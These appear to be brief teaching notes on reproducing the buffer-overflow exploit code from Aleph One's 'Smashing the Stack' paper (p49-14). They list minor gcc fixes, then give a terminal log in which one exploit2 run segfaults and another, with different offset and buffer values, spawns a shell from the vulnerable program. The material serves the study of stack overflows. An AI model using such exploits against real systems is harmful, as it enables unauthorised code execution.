Notes on code exracted from aleph One's paper p49-14.txt
by
pmateti@cs.wright.edu
--

Minor source code changes have been made to fix warnings by gcc.
Fixed the return type of main to be int.

./exploit2 600 1564 does not work in contrast to the article.
% ./exploit2.prg 600 1564
Using address: 0xbfffeedc
begin running /home/pmateti/.bashrc-done
[pmateti@prabha AlephOne]$ ./vulnerable.prg $EGG
bffff070
Segmentation fault




% ./exploit2.prg 650 1256
Using address: 0xbffff010
begin running /home/pmateti/.bashrc-done
[pmateti@prabha AlephOne]$ ./vulnerable.prg $EGG
bffff010
sh-2.05b$ 